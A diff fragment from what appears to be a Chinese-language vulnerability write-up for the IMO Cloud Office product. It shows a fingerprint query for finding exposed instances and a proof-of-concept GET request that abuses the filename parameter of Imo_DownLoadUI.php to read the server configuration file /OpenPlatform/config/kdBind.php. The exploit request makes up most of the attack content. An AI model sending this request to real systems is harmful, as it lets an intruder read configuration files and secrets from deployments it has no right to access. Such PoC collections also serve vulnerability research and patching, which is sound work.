@@ -8,7 +8,7 @@ imo云办公室由于 /file/Placard/upload/Imo_DownLoadUI.php 页面 filename �
 app="IMO-云办公室"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php HTTP/1.1
